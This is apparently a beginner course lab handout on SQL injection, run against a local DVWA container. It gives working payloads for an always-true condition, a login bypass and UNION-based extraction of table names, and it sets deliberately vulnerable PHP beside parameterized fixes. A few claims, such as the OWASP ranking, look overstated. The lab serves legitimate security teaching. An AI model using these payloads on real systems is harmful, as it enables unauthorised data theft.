# Lab 09 — Web Vulnerabilities: SQL Injection

**Course:** SCIA-120 · Introduction to Secure Computing  
**Topic:** Secure Programming — OWASP Top 10 / SQL Injection  
**Difficulty:** ⭐⭐ Beginner–Intermediate  
**Estimated Time:** 60–75 minutes  
**Related Reading:** Chapter 8 — Internet Security, Chapter 9 — Secure Programming

---

## Overview

SQL Injection (SQLi) is consistently ranked #1 in the OWASP Top 10 most critical web application vulnerabilities. It occurs when user input is directly inserted into a database query without sanitization, allowing attackers to manipulate the query logic. In this lab you will run a deliberately vulnerable web application in Docker, exploit it to extract data, and then apply the fix.

---

!!! warning "Educational Purpose"
    This lab uses an intentionally vulnerable application designed for security education. All attacks are performed against a local Docker container you control. Never attempt these techniques on systems you do not own or have explicit written permission to test.

---

## Learning Objectives

1. Understand why SQL injection occurs (unsanitized user input in queries).
2. Perform a basic SQL injection to bypass a login.
3. Extract database contents using UNION-based injection.
4. Apply parameterized queries to fix the vulnerability.
5. Understand the difference between vulnerable and secure code.

---

## Prerequisites

- Docker Desktop installed and running.

---

## Part 1 — Launch the Vulnerable Application

We will use **DVWA (Damn Vulnerable Web Application)** — an intentionally insecure app built for education.

### Step 1.1 — Start DVWA

```bash
docker run -d \
  --name dvwa \
  -p 8888:80 \
  vulnerables/web-dvwa
```

### Step 1.2 — Wait and Verify

```bash
sleep 10
docker ps | grep dvwa
```

### Step 1.3 — Initialize the Database

Open a browser and go to: `http://localhost:8888`

1. Log in with: `admin` / `password`
2. Scroll to the bottom and click **"Create / Reset Database"**
3. Log in again with the same credentials

📸 **Screenshot checkpoint:** Take a screenshot of the DVWA dashboard after logging in.

### Step 1.4 — Set Security Level to Low

In the DVWA menu, click **"DVWA Security"** → set to **Low** → Submit.

📸 **Screenshot checkpoint:** Take a screenshot showing security level set to "Low".

---

## Part 2 — Understanding the Vulnerability

Navigate to **SQL Injection** in the left sidebar.

You'll see a form that says: *"User ID: [ input ] [ Submit ]"*

The backend PHP code for this form looks something like:

```php
// VULNERABLE CODE — DO NOT USE IN REAL APPLICATIONS
$id = $_GET['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
```

The problem: `$id` is inserted directly into the SQL query without any sanitization.

### Step 2.1 — Normal Use

Enter `1` in the User ID field and submit.

**Result:** You see `admin` — the user with ID 1.

📸 **Screenshot checkpoint:** Take a screenshot of the normal query result.

### Step 2.2 — Test for SQL Injection

Enter `1'` (with a single quote) and submit.

**Expected result:** A database error — because the single quote broke the SQL query syntax. This confirms the input field is injectable.

📸 **Screenshot checkpoint:** Take a screenshot of the SQL error message.

---

## Part 3 — Exploiting SQL Injection

### Step 3.1 — Boolean-Based: Always-True Condition

Enter this in the User ID field:

```
1' OR '1'='1
```

**What this does:** The query becomes:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1'
```

Since `'1'='1'` is always true, this returns **all users** in the database.

📸 **Screenshot checkpoint:** Take a screenshot showing all users returned.

### Step 3.2 — Login Bypass (Classic Attack)

Navigate to the DVWA login page and try logging in with:
- Username: `admin' --`
- Password: anything

The `--` comments out the rest of the SQL query, including the password check:
```sql
SELECT * FROM users WHERE username='admin' --' AND password='anything'
```

📸 **Screenshot checkpoint:** Take a screenshot showing the login bypass result.

### Step 3.3 — Extract Database Information with UNION

Enter this in the SQL Injection form:

```
1' UNION SELECT user(), database() -- 
```

**What this does:** Appends a second SELECT to the query that returns the current database user and database name.

📸 **Screenshot checkpoint:** Take a screenshot showing the database user and database name revealed.

### Step 3.4 — Extract Table Names

```
1' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema=database() -- 
```

📸 **Screenshot checkpoint:** Take a screenshot showing the database table names extracted.

---

## Part 4 — The Fix: Parameterized Queries

### Step 4.1 — Understand the Root Cause

The vulnerability exists because user input is concatenated directly into the SQL string. The fix is to use **parameterized queries** (also called prepared statements) — the database treats input as pure data, never as SQL code.

**Vulnerable code (PHP):**

```php
// DANGEROUS
$id = $_GET['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result = mysqli_query($conn, $query);
```

**Secure code (PHP with parameterized query):**

```php
// SAFE
$id = $_GET['id'];
$stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->bind_param("s", $id);
$stmt->execute();
$result = $stmt->get_result();
```

### Step 4.2 — See the Fix in Action in DVWA

Change DVWA security to **Medium** (DVWA Security → Medium → Submit).

Navigate to **SQL Injection** and try the same injection: `1' OR '1'='1`

**Observe:** The Medium security level escapes special characters. The injection no longer works as expected.

Navigate to **SQL Injection (Blind)** → this page uses prepared statements. Try the same injection — it simply returns no result or the expected single result.

📸 **Screenshot checkpoint:** Take a screenshot showing the injection no longer works on Medium/High security.

### Step 4.3 — Python Demonstration of Parameterized Queries

```bash
docker run --rm python:3.11-slim bash -c "
python3 -c \"
import sqlite3

conn = sqlite3.connect(':memory:')
conn.execute('CREATE TABLE users (id INT, name TEXT, password TEXT)')
conn.execute(\\\"INSERT INTO users VALUES (1, 'alice', 'secret')\\\")
conn.execute(\\\"INSERT INTO users VALUES (2, 'bob', 'hunter2')\\\")

# Vulnerable approach
user_input = \\\"1' OR '1'='1\\\"
print('=== VULNERABLE (string concat) ===')
try:
    cur = conn.execute(f\\\"SELECT name FROM users WHERE id = '{user_input}'\\\")
    print('Results:', [r[0] for r in cur.fetchall()])
except Exception as e:
    print('Error:', e)

# Safe approach (parameterized)
print('=== SAFE (parameterized) ===')
cur = conn.execute('SELECT name FROM users WHERE id = ?', (user_input,))
print('Results:', [r[0] for r in cur.fetchall()])
print('(No results — injection attempt neutralized)')
\"
"
```

📸 **Screenshot checkpoint:** Take a screenshot showing the vulnerable vs. safe query behavior.

---

## Cleanup

```bash
docker stop dvwa && docker rm dvwa
docker system prune -f
```

---

## Lab Assessment

### Screenshot Submission Checklist

- [ ] `screenshot-09a` — DVWA dashboard logged in
- [ ] `screenshot-09b` — Security level set to "Low"
- [ ] `screenshot-09c` — Normal query result (User ID = 1)
- [ ] `screenshot-09d` — SQL error from single quote input
- [ ] `screenshot-09e` — All users returned with OR injection
- [ ] `screenshot-09f` — Login bypass
- [ ] `screenshot-09g` — UNION injection revealing DB user and name
- [ ] `screenshot-09h` — Table names extracted
- [ ] `screenshot-09i` — Injection blocked at Medium security
- [ ] `screenshot-09j` — Python vulnerable vs. parameterized comparison

### Reflection Questions

1. Explain in your own words *why* SQL injection works. What is the fundamental programming mistake that makes it possible?
2. What is a **parameterized query**, and how does it prevent SQL injection at a technical level?
3. A company stores 10 million user records in a database. If SQL injection is exploited to dump the database, what types of damage could result? Consider financial, legal, and reputational impacts.
4. Beyond parameterized queries, name two additional defenses against SQL injection. (Hint: think about input validation and database user privileges.)

---

!!! tip "Grading Rubric"
    - Screenshots complete and clearly labeled: **40 points**  
    - Vulnerable vs. secure code explanation: **20 points**  
    - Reflection questions answered thoughtfully: **40 points**  
    - **Total: 100 points**
